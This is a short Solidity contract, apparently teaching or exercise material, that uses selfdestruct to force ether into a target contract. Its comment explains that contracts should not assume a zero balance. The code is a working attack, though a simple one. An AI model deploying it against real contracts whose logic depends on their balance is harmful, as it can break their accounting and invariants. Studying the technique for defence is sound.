// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract ForceFallback {
    address immutable i_forceAddress;

    constructor(address _forceAddress) payable {
        require(msg.value >= 0.001 ether, "Not enough eth");
        i_forceAddress = _forceAddress;
    }

    /**
        @notice Attack function to trigger MishandlingEth issue
        
        @dev In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.
        However, there is no way to stop an attacker from sending ether to a contract by self destroying. 
        Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
    */
    function sendEthForceFallback() external {
        selfdestruct(payable(i_forceAddress));
    }
}